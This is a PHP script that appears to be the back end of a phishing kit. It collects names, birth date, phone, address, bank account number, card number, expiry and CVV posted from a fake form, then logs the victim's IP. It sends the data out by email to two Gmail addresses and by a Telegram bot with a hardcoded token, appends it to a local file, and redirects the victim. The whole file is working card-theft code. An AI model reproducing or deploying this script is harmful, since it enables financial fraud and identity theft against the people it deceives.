<?php

$ip = $_SERVER['REMOTE_ADDR'];
//$hostname = gethostbyaddr($ip);
$message .= "|----------||--------------|\n";
$message .= "|Prénom            : ".$_POST['AK01']."\n";
$message .= "|Nom          : ".$_POST['AK02']."\n";
$message .= "|dn           : ".$_POST['AK03']."-".$_POST['AK04']."-".$_POST['AK05']."\n";
$message .= "|tel          : ".$_POST['AK06']."\n";
$message .= "|pos          : ".$_POST['AK07']."\n";
$message .= "|add          : ".$_POST['AK08']."\n";
$message .= "|----------| cvv |--------------|\n";
$message .= "bnq             : ".$_POST['bank']."\n";
$message .= "nc              : ".$_POST['account']."\n";
$message .= "Cc              : ".$_POST['ccnum']."\n";
$message .= "dt              : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "|Client IP: ".$ip."\n";
$hello   .= "Hello Bro its Come   : ".$_POST['ccnum']."\n";
//$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------||--------------|\n";
$send = "pythonht@gmail.com , zakariamouad96@gmail.com";
$subject = "From:  [ $ip ]";
{
mail("$send", "$subject", $hello);
$token = "1750131011:AAHFrD5DhUedFAlUMkYyQplMZ6XYZ2uMxmE";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-1001351463023&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-1001351463023&text=" . urlencode($hello)."" );
}

$f = fopen("../python/python.php", "a");
	fwrite($f, $message);

header("Location:load1.html");
?>
